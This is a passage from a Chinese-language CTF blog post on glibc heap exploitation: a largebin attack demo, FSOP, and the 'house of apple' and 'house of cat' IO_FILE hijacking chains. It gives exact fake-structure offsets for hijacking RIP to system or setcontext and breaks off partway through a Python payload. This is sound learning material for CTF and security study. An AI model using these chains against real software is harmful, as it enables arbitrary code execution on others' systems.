class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>达到一个任意地址写成堆地址的目的。<br>Glibc 2.29 之前，unsortedbin attack 和 largebin attack 都是攻击 bk 指针，但是后来加了一句检查</p>
<p>在攻击时，fd,bk,fd_nextsize 可以随便覆盖内容，在经过malloc后会修复fd，因为fd指向 size 较小的 victim</p>
<h3 id="IO-流"><a href="#IO-流" class="headerlink" title="IO 流"></a>IO 流</h3><p>这里一般指 存在一条链，某个函数 使用 vtable 的函数指针来调用函数。</p>
<p>程序使用exit退出程序</p>
<ul>
<li>从main函数退出，glibc会调用exit</li>
<li>显示调用 exit 函数退出程序</li>
</ul>
<p>malloc_assert: house of kiwi 提出，触发下面的条件选一个</p>
<ul>
<li>topchunk的大小小于MINSIZE(0X20)  </li>
<li>prev inuse位为0  </li>
<li>old_top页未对齐</li>
<li>但是从libc 2.36 发生了一点变化，移除IO操作，也就是从libc 2.36不能使用</li>
<li>libc 2.37 直接没有这个函数了。</li>
</ul>
<p>libc 2.35：</p>
<ul>
<li>两个函数(fflsh, fxpeintf)都涉及IO操作。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行_IO_flush_all_lockp函数，这个函数会根据_IO_list_all刷新链表中的所有文件流.</p>
<p>当程序从 main 函数返回或者执行 exit 函数的时候，均会调用 fcloseall 函数，调用链如下</p>
<ul>
<li>最后会遍历<code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">	fcloseall</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all_lockp</span><br><span class="line">				_IO_OVERFLOW</span><br></pre></td></tr></table></figure>


<p>vtable 函数调用过程，就是调用跳表，比如说调用 <code>__overflow</code> </p>
<ul>
<li><code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</li>
<li>最后就是调用 vtable 里面的函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a</span></span><br></pre></td></tr></table></figure>

<p>检查函数</p>
<ul>
<li>检查此结构体的 vtable 与 <code>__io_vtables</code> 全局变量表偏移</li>
<li>在这个表里的表就能通过检查。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在劫持vtable都差不多在这个表里找一个能符合条件的表进行利用。</p>
<p>比如挟持到 <code>_wide_data</code> 相关的表，因为这个表含有vtable，并且函数调用没有检查。</p>
<ul>
<li>而与其相关的表有3个 找 <code>_IO_wfile_jumps</code> 开头的表存在三个</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><blockquote>
<p>有三个版本，这里是 version 2.0，控制函数执行流。</p>
</blockquote>
<ol>
<li>IO 流：exit 或者 malloc_assert</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址 </li>
<li>能使用一次 <code>largebin attack</code>（一次即可）</li>
</ol>
<p>wide_data 结构体</p>
<ul>
<li>其中也存在一个 vtable</li>
<li>由上面的FSOP知道，在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，但是没有检查，因此更好利用</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>假设劫持了vtable 到 <code>IO_wdata_jumps</code> 之后，调用overflow</p>
<ul>
<li>因为是宏展开，进入 <code>_IO_wfile_jumps</code> 的 overflow 函数。</li>
<li>而这个函数执行流如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow(FILE *f, <span class="type">wint_t</span> wch) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> ||</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>) &#123;</span><br><span class="line">      _IO_wdoallocbuf(f);</span><br><span class="line">      _IO_free_wbackup_area(f);</span><br><span class="line">      _IO_wsetg(f, f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">         (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">         the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">         block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">         that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">         external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end) &#123;</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF) <span class="keyword">return</span> _IO_do_flush(f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) ||</span><br><span class="line">      ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span>(_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>

<p>主要看其中的函数调用，这里主要看作者的几条连</p>
<p>链1：<code>_IO_wfile_overflow</code> 控制函数执行流，但是需要绕过某些检查。伪造fp</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code>，比如说C为system函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链2：<code>_IO_wfile_underflow_mmap</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链3：<code>_IO_wdefault_xsgetn</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>



<p>总结一下：使用 <code>largebin attack</code> 劫持<code>_IO_list_all</code> 变量</p>
<ul>
<li>将其替换为一个伪造的 <code>IO_FILE</code> 结构体（某个我们可控内容的堆）</li>
<li>IO_FILE的 <code>_wide_data</code> 伪造为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>IO_FILE的 <code>vtable</code> 伪造为 <code>_IO_wfile_jumps</code>，这是一个 const 变量, gdb使用<code>p &amp;_IO_wfile_jumps</code>查看</li>
<li>在需要写shellcode时，将C设置为一个写满ROP的堆地址就行。常使用setcontext</li>
</ul>
<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>函数调用链</p>
<ul>
<li><code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数中来攻击</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__malloc_assert</span><br><span class="line">	​__fxprintf</span><br><span class="line">		​locked_vfxprintf</span><br><span class="line">			__vfprintf_internal #在这里是跳转到IO_validate_vtable通过vtable+<span class="number">0x38</span>调用的下面函数</span><br><span class="line">				​_IO_wfile_seekoff</span><br><span class="line">					_IO_switch_to_wget_mode</span><br><span class="line">						​call qword ptr [rax + <span class="number">0x18</span>] <span class="meta">#rax是伪造的io_file的地址</span></span><br></pre></td></tr></table></figure>


<p>并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<code>_IO_wfile_seekoff</code>即可（通常是结合<code>__malloc_assert</code>，改vtable为<code>_IO_wfile_jumps+0x10</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))   <span class="comment">// xxxx</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>


<p>在这里调用 <code>_wide_data</code> 里的 <code>vtable的_overflow</code>，JUMP宏 且没有检查</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>

<p>在<code>_IO_switch_to_wget_mode</code> 调试时发现如下的汇编代码</p>
<ul>
<li>rdi 是 fp 指针，是我们可以伪造的一个 IO_FILE。</li>
<li>通过 rdi控制 rax，在通过rax控制rdx，也可以过jbe指令。从而最后call 我们指定的shellcode</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line"> <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line"> <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line"> <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>

<p>所以最后的伪造如下</p>
<ul>
<li>rax1 为上面的rax</li>
<li>rax2 为下面的rax寄存器</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span>                        <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)                              <span class="comment"># _flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)                        <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)               <span class="comment"># _IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)                       <span class="comment"># _IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span 